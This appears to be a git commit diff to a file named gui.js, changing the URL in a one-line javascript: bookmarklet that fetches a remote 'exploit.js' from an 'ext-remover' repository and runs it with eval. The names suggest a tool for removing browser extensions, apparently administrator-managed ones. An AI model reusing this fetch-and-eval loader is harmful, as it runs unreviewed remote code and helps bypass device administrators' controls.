96563e05ae0ae7a4adacd4a226f38c687fec23e3
Echo <echo-the-coder@tuta.io>
2022-09-19 14:59:36 -0400

    Update link to current repo

--- gui.js
+++ gui.js
@@ -1,1 +1,1 @@
-javascript:fetch(`https://raw.githubusercontent.com/UnknownKeeper88888/ext-remover-2.0/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
